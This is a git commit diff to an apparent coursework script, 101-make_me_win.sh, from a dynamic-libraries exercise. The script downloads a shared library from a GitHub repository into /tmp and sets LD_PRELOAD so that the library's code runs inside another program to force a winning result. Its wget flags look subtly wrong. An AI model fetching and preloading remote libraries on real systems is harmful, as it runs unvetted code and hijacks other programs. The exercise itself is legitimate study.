b692ee6a0febb6328cc35bc0da9ef14ba17ff529
zouhairmariouate01 <zouhairmarioute@gmail.com>
2024-01-15 14:27:53 -0800

    tsk

--- 0x18-dynamic_libraries/101-make_me_win.sh
+++ 0x18-dynamic_libraries/101-make_me_win.sh
@@ -1,3 +1,3 @@
 #!/bin/bash
-wget -q /tmp https://github.com/zouhairmariouate01/alx-low_level_programming/raw/main/0x18-dynamic_libraries/hack.so
-export LD_PRELOAD=/tmp/hack.so
+wget -p /tmp https://github.com/Kennie-Simz/alx-low_level_programming/raw/main/0x18-dynamic_libraries/libgiga.so
+export LD_PRELOAD=/tmp/libgiga.so
